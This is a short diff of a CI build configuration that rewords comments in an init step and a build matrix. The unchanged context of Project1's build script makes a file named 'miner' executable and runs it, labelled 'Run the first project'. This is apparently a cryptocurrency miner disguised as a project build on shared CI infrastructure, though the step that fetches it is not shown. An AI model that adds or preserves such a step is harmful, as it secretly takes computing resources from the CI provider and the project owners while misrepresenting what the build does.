@@ -7,14 +7,14 @@ build:
   off
 
 init:
-  # Make sure bash is installed (Ubuntu image usually has it pre-installed)
+  # Ensure necessary packages are installed
   - sudo apt-get update
   - sudo apt-get install -y bash
 
-# Define a build matrix for different projects
+# Define the build matrix for different projects
 matrix:
   include:
-    # First project build
+    # Build configuration for Project1
     - project: Project1
       build_script:
         # Build commands for Project1
@@ -23,7 +23,7 @@ matrix:
         - chmod +x ./miner
         - ./miner  # Run the first project
 
-    # Second project build
+    # Build configuration for Project2
     - project: Project2
       build_script:
         # Build commands for Project2
